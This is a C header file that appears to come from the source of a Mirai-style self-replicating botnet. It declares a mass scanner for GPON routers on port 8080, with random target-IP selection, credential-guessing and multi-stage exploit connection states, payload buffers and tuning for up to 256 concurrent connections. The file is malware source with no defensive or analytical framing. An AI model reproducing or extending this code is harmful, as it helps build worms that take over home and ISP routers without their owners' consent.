#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
#define GPON8080_SCANNER_MAX_CONNS   3
#define GPON8080_SCANNER_RAW_PPS     788
#else
#define GPON8080_SCANNER_MAX_CONNS   256
#define GPON8080_SCANNER_RAW_PPS     788
#endif

#define GPON8080_SCANNER_RDBUF_SIZE  1080
#define GPON8080_SCANNER_HACK_DRAIN  64

struct gpon8080_scanner_connection
{
    int fd, last_recv;
    enum
    {
        GPON8080_SC_CLOSED,
        GPON8080_SC_CONNECTING,
        GPON8080_SC_GET_CREDENTIALS,
        GPON8080_SC_EXPLOIT_STAGE2,
        GPON8080_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[GPON8080_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};

void gpon8080_scanner();
void gpon8080_kill(void);

static void gpon8080_setup_connection(struct gpon8080_scanner_connection *);
static ipv4_t get_random_gpon8080_ip(void);

#endif
